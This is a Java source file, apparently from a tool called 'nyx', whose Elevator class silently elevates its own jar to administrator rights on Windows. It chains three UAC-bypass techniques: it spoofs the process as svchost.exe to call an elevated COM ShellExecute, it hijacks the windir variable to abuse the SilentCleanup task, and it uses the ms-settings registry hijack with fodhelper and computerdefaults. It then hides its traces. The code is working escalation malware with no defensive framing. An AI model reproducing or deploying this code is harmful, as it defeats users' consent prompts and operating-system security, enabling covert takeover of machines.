package com.example.screen;

import com.sun.jna.Function;
import com.sun.jna.Library;
import com.sun.jna.Memory;
import com.sun.jna.Native;
import com.sun.jna.Pointer;
import com.sun.jna.Structure;
import com.sun.jna.WString;
import com.sun.jna.platform.win32.Kernel32;
import com.sun.jna.platform.win32.Shell32;
import com.sun.jna.platform.win32.Guid.GUID;
import com.sun.jna.platform.win32.WinDef.INT_PTR;
import com.sun.jna.platform.win32.WinNT.HANDLE;
import com.sun.jna.ptr.IntByReference;
import com.sun.jna.ptr.PointerByReference;
import java.io.File;
import java.io.FileOutputStream;
import java.io.FileWriter;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Date;
import java.util.List;
import java.util.Random;

public final class Elevator {
   private static final String FAKE_IMAGE = "C:\\Windows\\System32\\svchost.exe";
   private static final String FAKE_CMD = "\"C:\\Windows\\System32\\svchost.exe\" -k netsvcs";
   private static final String CLSID = "Elevation:Highest!new:{3E5FC7F9-9A51-4367-9063-A120244FBEC7}";
   private static final String IID = "{6EDD6D74-C007-4E75-B76A-E5740995E24C}";
   private static Memory keep;
   private static final String MS_SETTINGS = "HKCU\\Software\\Classes\\ms-settings";
   private static final String MS_CMD = "HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command";

   private Elevator() {
   }

   private static void log(String msg) {
      try {
         String windir = System.getenv("WINDIR");
         File f = new File((windir == null ? "C:\\Windows" : windir) + "\\Temp", "nyx.elevate.log");
         FileWriter w = new FileWriter(f, true);

         try {
            w.write(new SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(new Date()) + " [screen] " + msg + "\r\n");
         } catch (Throwable var7) {
            try {
               w.close();
            } catch (Throwable var6) {
               var7.addSuppressed(var6);
            }

            throw var7;
         }

         w.close();
      } catch (Throwable var8) {
      }
   }

   public static boolean tryHigh(String tag, String[] argv) {
      try {
         String java = System.getProperty("java.home") + "\\bin\\java.exe";
         String jar = new File(Elevator.class.getProtectionDomain().getCodeSource().getLocation().toURI()).getAbsolutePath();
         StringBuilder sb = new StringBuilder("-jar \"").append(jar).append('"');
         if (argv != null) {
            for (String a : argv) {
               sb.append(" \"").append(a.replace("\"", "\\\"")).append('"');
            }
         }

         String args = sb.toString();
         String windir = System.getenv("WINDIR");
         File marker = new File((windir == null ? "C:\\Windows" : windir) + "\\Temp", "nyx." + tag + ".high");
         marker.delete();
         HANDLE proc = Kernel32.INSTANCE.GetCurrentProcess();
         Memory pbi = new Memory(48L);
         int nt = Elevator.Nt.INSTANCE.NtQueryInformationProcess(proc, 0, pbi, 48, new IntByReference());
         if (nt != 0) {
            log("NtQueryInformationProcess failed nt=0x" + Integer.toHexString(nt));
            return false;
         }

         Pointer peb = pbi.getPointer(8L);
         if (peb == null) {
            log("PEB null");
            return false;
         }

         Pointer pp = peb.getPointer(32L);
         if (pp == null) {
            log("ProcessParameters null");
            return false;
         }

         int len1 = pp.getShort(96L) & '\uffff';
         int max1 = pp.getShort(98L) & '\uffff';
         Pointer buf1 = pp.getPointer(104L);
         int len2 = pp.getShort(112L) & '\uffff';
         int max2 = pp.getShort(114L) & '\uffff';
         Pointer buf2 = pp.getPointer(120L);
         keep = new Memory(2048L);
         keep.setWideString(0L, "C:\\Windows\\System32\\svchost.exe");
         keep.setWideString(1024L, "\"C:\\Windows\\System32\\svchost.exe\" -k netsvcs");
         writeUni(pp, 96, "C:\\Windows\\System32\\svchost.exe", keep.share(0L));
         writeUni(pp, 112, "\"C:\\Windows\\System32\\svchost.exe\" -k netsvcs", keep.share(1024L));
         boolean ok = false;

         try {
            writeMarker(marker, "1");
            Elevator.Ole32.INSTANCE.CoInitializeEx(null, 2);
            Elevator.BindOpts3 bo = new Elevator.BindOpts3();
            bo.cbStruct = bo.size();
            bo.dwClassContext = 4;
            PointerByReference out = new PointerByReference();
            int hr = Elevator.Ole32.INSTANCE
               .CoGetObject(
                  new WString("Elevation:Highest!new:{3E5FC7F9-9A51-4367-9063-A120244FBEC7}"),
                  bo.getPointer(),
                  new GUID("{6EDD6D74-C007-4E75-B76A-E5740995E24C}"),
                  out
               );
            Pointer obj = out.getValue();
            log("CoGetObject hr=0x" + Integer.toHexString(hr) + " obj=" + (obj != null));
            if (hr == 0 && obj != null) {
               Pointer vt = obj.getPointer(0L);
               Function fn = Function.getFunction(vt.getPointer(9L * Native.POINTER_SIZE), 63);
               int hr2 = fn.invokeInt(new Object[]{obj, new WString(java), new WString(args), null, 0, 0});
               log("ShellExecute hr=0x" + Integer.toHexString(hr2) + " java=" + java);
               Function rel = Function.getFunction(vt.getPointer(2L * Native.POINTER_SIZE), 63);
               rel.invokeInt(new Object[]{obj});
               ok = hr2 == 0;
            }

            Elevator.Ole32.INSTANCE.CoUninitialize();
         } finally {
            pp.setShort(96L, (short)len1);
            pp.setShort(98L, (short)max1);
            pp.setPointer(104L, buf1);
            pp.setShort(112L, (short)len2);
            pp.setShort(114L, (short)max2);
            pp.setPointer(120L, buf2);
         }

         if (!ok) {
            marker.delete();
         }

         if (ok) {
            return true;
         } else {
            return silentCleanup(tag, argv, marker) ? true : uacBypass(tag, argv, marker);
         }
      } catch (Throwable t) {
         log("exception " + t.getClass().getName() + ": " + t.getMessage());
         return false;
      }
   }

   private static boolean silentCleanup(String tag, String[] argv, File marker) {
      File cmdFile = null;

      try {
         writeMarker(marker, "silentcleanup");
         String tmp = System.getenv("TEMP");
         if (tmp == null || tmp.trim().isEmpty()) {
            tmp = System.getProperty("java.io.tmpdir", "C:\\Windows\\Temp");
         }

         cmdFile = new File(tmp, "rs-elev-" + Long.toHexString(new Random().nextLong()) + ".cmd");
         String body = "@echo off\r\nstart \"\" " + elevationCommand(argv) + "\r\ndel \"%~f0\" >nul 2>nul\r\n";
         FileOutputStream out = new FileOutputStream(cmdFile);

         try {
            out.write(body.getBytes("UTF-8"));
         } catch (Throwable var10) {
            try {
               out.close();
            } catch (Throwable var9) {
               var10.addSuppressed(var9);
            }

            throw var10;
         }

         out.close();
         int var12 = run("reg", "add", "HKCU\\Environment", "/v", "windir", "/t", "REG_SZ", "/d", cmdFile.getAbsolutePath(), "/f");
         int runRc = run("schtasks", "/run", "/tn", "\\Microsoft\\Windows\\DiskCleanup\\SilentCleanup");
         Thread.sleep(8000L);
         run("reg", "delete", "HKCU\\Environment", "/v", "windir", "/f");
         log("silentcleanup reg=" + var12 + " run=" + runRc + " cmd=" + cmdFile.getAbsolutePath());
         if (cmdFile.exists()) {
            cmdFile.delete();
         }

         if (var12 == 0 && runRc == 0) {
            return true;
         }

         marker.delete();
         return false;
      } catch (Throwable t) {
         log("silentcleanup exception " + t.getClass().getName() + ": " + t.getMessage());
         if (cmdFile != null && cmdFile.exists()) {
            cmdFile.delete();
         }

         return false;
      }
   }

   private static String elevationCommand(String[] argv) {
      String javaw = System.getProperty("java.home") + "\\bin\\javaw.exe";

      String jar;
      try {
         jar = new File(Elevator.class.getProtectionDomain().getCodeSource().getLocation().toURI()).getAbsolutePath();
      } catch (Throwable t) {
         jar = new File(System.getProperty("java.class.path", "")).getAbsolutePath();
      }

      StringBuilder cmd = new StringBuilder("\"").append(javaw).append("\" -jar \"").append(jar).append("\"");
      if (argv != null) {
         for (String a : argv) {
            if (a != null && !a.trim().isEmpty()) {
               cmd.append(" \"").append(a.replace("\"", "\\\"")).append("\"");
            }
         }
      }

      return cmd.toString();
   }

   private static int run(String... args) {
      try {
         List<String> cmd = new ArrayList<>();

         for (String a : args) {
            cmd.add(a);
         }

         Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start();
         return p.waitFor();
      } catch (Throwable t) {
         return -1;
      }
   }

   private static boolean uacBypass(String tag, String[] argv, File marker) {
      try {
         String javaw = System.getProperty("java.home") + "\\bin\\javaw.exe";
         String jar = new File(Elevator.class.getProtectionDomain().getCodeSource().getLocation().toURI()).getAbsolutePath();
         StringBuilder cmd = new StringBuilder("\"").append(javaw).append("\" -jar \"").append(jar).append("\"");
         if (argv != null) {
            for (String a : argv) {
               cmd.append(" \"").append(a.replace("\"", "\\\"")).append("\"");
            }
         }

         String command = cmd.toString();
         writeMarker(marker, "uac");
         reg("add", "HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command", "/ve", "/d", command, "/f");
         reg("add", "HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command", "/v", "DelegateExecute", "/t", "REG_SZ", "/d", "", "/f");
         boolean launched = spawn(
               System.getenv("SystemRoot") == null
                  ? "C:\\Windows\\System32\\computerdefaults.exe"
                  : System.getenv("SystemRoot") + "\\System32\\computerdefaults.exe"
            )
            | spawn(System.getenv("SystemRoot") == null ? "C:\\Windows\\System32\\fodhelper.exe" : System.getenv("SystemRoot") + "\\System32\\fodhelper.exe");
         Thread.sleep(3000L);
         reg("delete", "HKCU\\Software\\Classes\\ms-settings", "/f");
         log("uac-bypass launched=" + launched + " cmd=" + command);
         if (!launched) {
            marker.delete();
         }

         return launched;
      } catch (Throwable t) {
         log("uac-bypass exception " + t.getClass().getName() + ": " + t.getMessage());
         return false;
      }
   }

   private static boolean spawn(String exe) {
      try {
         INT_PTR r = Shell32.INSTANCE.ShellExecute(null, "open", exe, null, null, 0);
         long code = r.longValue();
         log("shellexec " + exe + " code=" + code);
         return code > 32L;
      } catch (Throwable t) {
         log("shellexec failed " + exe + ": " + t.getClass().getSimpleName() + ": " + t.getMessage());
         return false;
      }
   }

   private static void reg(String... args) {
      try {
         List<String> cmd = new ArrayList<>();
         cmd.add("reg");

         for (String a : args) {
            cmd.add(a);
         }

         Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start();
         p.waitFor();
      } catch (Throwable var6) {
      }
   }

   private static void writeUni(Pointer pp, int off, String s, Pointer mem) {
      pp.setShort(off, (short)(s.length() * 2));
      pp.setShort(off + 2, (short)(s.length() * 2 + 2));
      pp.setPointer(off + 8, mem);
   }

   private static void writeMarker(File f, String text) {
      try {
         FileOutputStream out = new FileOutputStream(f);

         try {
            out.write(text.getBytes());
         } catch (Throwable var6) {
            try {
               out.close();
            } catch (Throwable var5) {
               var6.addSuppressed(var5);
            }

            throw var6;
         }

         out.close();
      } catch (Throwable var7) {
      }
   }

   public static final class BindOpts3 extends Structure {
      public int cbStruct;
      public int dwFlags;
      public int dwClassContext;
      public Pointer riid;
      public Pointer pServerInfo;
      public Pointer hwnd;

      protected List<String> getFieldOrder() {
         return Arrays.asList("cbStruct", "dwFlags", "dwClassContext", "riid", "pServerInfo", "hwnd");
      }
   }

   public interface Nt extends Library {
      Elevator.Nt INSTANCE = (Elevator.Nt)Native.load("ntdll", Elevator.Nt.class);

      int NtQueryInformationProcess(HANDLE h, int cls, Pointer buf, int len, IntByReference ret);
   }

   public interface Ole32 extends Library {
      Elevator.Ole32 INSTANCE = (Elevator.Ole32)Native.load("ole32", Elevator.Ole32.class);

      int CoInitializeEx(Pointer pv, int coinit);

      int CoGetObject(WString name, Pointer opts, GUID iid, PointerByReference out);

      void CoUninitialize();
   }
}
